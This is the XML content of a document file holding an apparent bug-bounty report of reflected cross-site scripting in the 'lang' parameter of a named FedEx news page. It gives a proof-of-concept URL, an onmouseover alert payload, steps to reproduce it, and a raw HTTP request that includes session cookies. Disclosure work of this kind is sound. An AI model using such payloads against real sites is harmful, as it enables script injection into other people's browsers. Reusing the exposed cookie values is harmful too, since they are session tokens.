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fo:color="#333333"/>
    </style:style>
    <style:style style:name="T3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4" style:family="text">
      <style:text-properties fo:font-size="12.00pt" fo:font-weight="normal" fo:font-family="Arial" style:font-family-asian="Arial" style:font-family-complex="Arial" fo:background-color="transparent" fo:color="#333333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7" style:family="text">
      <style:text-properties fo:font-size="12.00pt" fo:font-weight="normal" fo:font-family="Arial" style:font-family-asian="Arial" style:font-family-complex="Arial" fo:background-color="transparent" fo:color="#333333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11" style:family="text">
      <style:text-properties fo:font-size="12.00pt" fo:font-weight="normal" fo:font-family="Arial" style:font-family-asian="Arial" style:font-family-complex="Arial" fo:background-color="transparent" fo:color="#333333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333333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Arial" style:font-family-asian="Arial" style:font-family-complex="Arial" fo:background-color="transparent" fo:color="#333333"/>
    </style:style>
    <style:style style:name="T20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Arial" style:font-family-asian="Arial" style:font-family-complex="Arial" fo:background-color="transparent" fo:color="#333333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20.00%" fo:text-align="left" fo:margin-bottom="5.65p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20.00%" fo:text-align="left" fo:margin-bottom="5.65pt"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph">
      <style:paragraph-properties fo:line-height="100.00%" fo:text-align="left" fo:margin-bottom="5.65pt"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph">
      <style:paragraph-properties fo:line-height="120.00%" fo:text-align="left" fo:margin-bottom="5.65pt"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph">
      <style:paragraph-properties fo:line-height="120.00%" fo:text-align="left" fo:margin-bottom="7.00pt"/>
    </style:style>
  </office:automatic-styles>
  <office:body>
    <office:text>
      <text:p text:style-name="P1"><text:span text:style-name="T1">Vulnerability Name : Cross site scripting </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T2">Cross-site Scripting (XSS) refers to client-side code injection attack wherein an attacker can execute malicious scripts (also commonly referred to as a malicious payload) into a legitimate website or web application. XSS is amongst the most rampant of web application vulnerabilities and occurs when a web application makes use of unvalidated or unencoded user input within the output it generates.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T2">By leveraging XSS, an attacker does not target a victim directly. Instead, an attacker would exploit a vulnerability within a website or web application that the victim would visit, essentially using the vulnerable website as a vehicle to deliver a malicious script to the victim’s browser.</text:span></text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T3">How Cross-site Scripting works</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T4">In order to run malicious JavaScript code in a victim’s browser, an attacker must first find a way to inject a payload into a web page that the victim visits. Of course, an attacker could use social engineering techniques to convince a user to visit a vulnerable page with an injected JavaScript payload.</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T4">In order for an XSS attack to take place the vulnerable website needs to directly include user input in its pages. An attacker can then insert a string that will be used within the web page and treated as code by the victim’s browser.</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T5"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T6">Vulnerable URL</text:span><text:span text:style-name="T7"><text:s/></text:span></text:p>
      <text:p text:style-name="P4"><text:a xlink:href="http://ftn.fedex.com/news/NewsBulletinDisplay.jsp?url=010218&amp;lang=180152668%22%20onmouseover%3dalert(9320)%20bad%3d%22"><text:span text:style-name="T8">http://ftn.fedex.com/news/NewsBulletinDisplay.jsp?url=010218&amp;lang=180152668%22%20onmouseover%3dalert(9320)%20bad%3d%22</text:span></text:a><text:span text:style-name="T9"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T9"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T10">Vulnerable item </text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T11">lang</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T12"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T13">Payload</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T14">180152668" onmouseover=alert(9320) bad="</text:span><text:span text:style-name="T15"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T16">How to reproduce this issue </text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T16">1. Visit this URL </text:span></text:p>
      <text:p text:style-name="P4"><text:a xlink:href="http://ftn.fedex.com/news/NewsBulletinDisplay.jsp?url=010218&amp;lang=180152668%22%20onmouseover%3dalert(9320)%20bad%3d%22"><text:span text:style-name="T17">http://ftn.fedex.com/news/NewsBulletinDisplay.jsp?url=010218&amp;lang=180152668%22%20onmouseover%3dalert(9320)%20bad%3d%22</text:span></text:a><text:span text:style-name="T18"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T18"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T19">2.<text:s text:c="3"/></text:span><text:span text:style-name="T20">it will alert<text:s text:c="2"/>a xss popup</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T21"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T22">Request Body : </text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T23">GET /news/NewsBulletinDisplay.jsp?url=010218&amp;lang=180152668%22%20onmouseover%3dalert(9320)%20bad%3d%22 HTTP/1.1</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T23">Host: ftn.fedex.com</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T23">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T23">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T23">Accept-Language: en-US,en;q=0.5</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T23">Accept-Encoding: gzip, deflate</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T23">Cookie: fdx_cbid=30207856121517300999353660080771; fdx_locale=en_US; ak_bmsc=856BE7FADD7B96E4CE9DECA5D5D7662A170BD73F97270000072D705AC3AF9641~plJTcx2CXS53xMq+3H9cefnaTvNHxFmyQeBL7SJjceVyWkM/O0FR8Qhs8qG1i8rPpQg3Hc9ZwQ4HZPfoWYaitrSvdv0lKPdJ+ppzWmWJgIcjgOhULeqo8IPFf74iZCkfnIOZJqEBGfxhfFKkLK5ikPUn+Wk2xJNba4dm85x26cni4NmYqjgBxdsfHjhZP0UowQIovlB1UfdKAGhP+E5HmI4tZhRahdoG/ZIJw/T8ZDUnM=; mbox=session#1517300999076-608852#1517302916; AMCV_1E22171B520E93BF0A490D44%40AdobeOrg=817868104%7CMCIDTS%7C17562%7CMCMID%7C56932753410506778462572766929483400768%7CMCAAMLH-1517905799%7C3%7CMCAAMB-1517905799%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCOPTOUT-1517308199s%7CNONE%7CMCAID%7CNONE; s_pers=%20s_dfa%3Dfedexus%252Cfedexglbl%7C1517302855784%3B%20s_visit%3D1%7C1517302868681%3B%20gpv_pageName%3Dncc%252Fhttps%253A%252F%252Fftn.fedex.com%252Fapp%252F%7C1517302868682%3B%20s_nr%3D1517301068684-New%7C1548837068684%3B%20s_vnum%3D1517337000687%2526vn%253D1%7C1517337000687%3B%20s_invisit%3Dtrue%7C1517302868687%3B%20s_tbm%3D1%7C1517302868689%3B%20s_prevChan%3DTyped%252FBookmarked%257C1517301068691%7C1518510668691%3B%20s_cpmcvp%3D%255B%255B%2527Typed%252FBookmarked%2527%252C%25271517301068693%2527%255D%255D%7C1675067468693%3B%20s_chancvp%3D%255B%255B%2527Typed%252FBookmarked%2527%252C%25271517301068694%2527%255D%255D%7C1675067468694%3B; s_sess=%20setLink%3D%3B%20SC_LINKS%3D%3B%20s_cm%3DundefinedTyped%252FBookmarkedTyped%252FBookmarkedundefined%3B%20s_cpc%3D1%3B%20s_ppv%3Dncc%252Fhttps%25253A%252F%252Fftn.fedex.com%252Fapp%252F%3B; countryPath=app; AMCVS_1E22171B520E93BF0A490D44%40AdobeOrg=1; bm_sv=CD33EF327AF51722A079E09515DCC217~u7MPjaWI4ufyJqe9VdFol52wk3qJSwAXrU8NYCkjjBEOaHXocFaAYyVL7MqkwQr0Q1QZbXKJEitKX89IEYhz936I2W+oTivqaO/ZlKBdW+MbIfL9oYmN7ZVqKQHJe5mWgRsLXKZMc7sHyzm2O3/6Jw==; s_sq=fedexus%252Cfedexglbl%3D%2526c.%2526a.%2526activitymap.%2526page%253Dncc%25252Fhttps%25253A%25252F%25252Fftn.fedex.com%25252Fapp%25252F%2526link%253DCanada%252520Border%252520Services%252520Agency%252527s%252520Single%252520Window%252520Initiative%2526region%253Dftn_content%2526pageIDType%253D1%2526.activitymap%2526.a%2526.c%2526pid%253DNCC%25252Fhttps%25253A%25252F%25252Fftn.fedex.com%25252Fapp%25252F%2526pidt%253D1%2526oid%253Dhttp%25253A%25252F%25252Fftn.fedex.com%25252Fnews%25252Fen%25252F010218%2526ot%253DA</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T23">DNT: 1</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T23">Connection: close</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T23">Upgrade-Insecure-Requests: 1</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T24">POC : </text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T24"><text:s/></text:span></text:p>
      <text:p text:style-name="P5"><draw:frame text:anchor-type="as-char" svg:width="152.40mm" svg:height="76.73mm" style:rel-width="scale" style:rel-height="scale"><draw:object-ole xlink:href="OleObj1"/><draw:image xlink:href="ObjectReplacements/OleObj1"/></draw:frame><text:span text:style-name="T24"/></text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T25"/></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T26">Regards </text:span></text:p>
      <text:p text:style-name="P7"><text:span text:style-name="T26">Shanmuka Prasad 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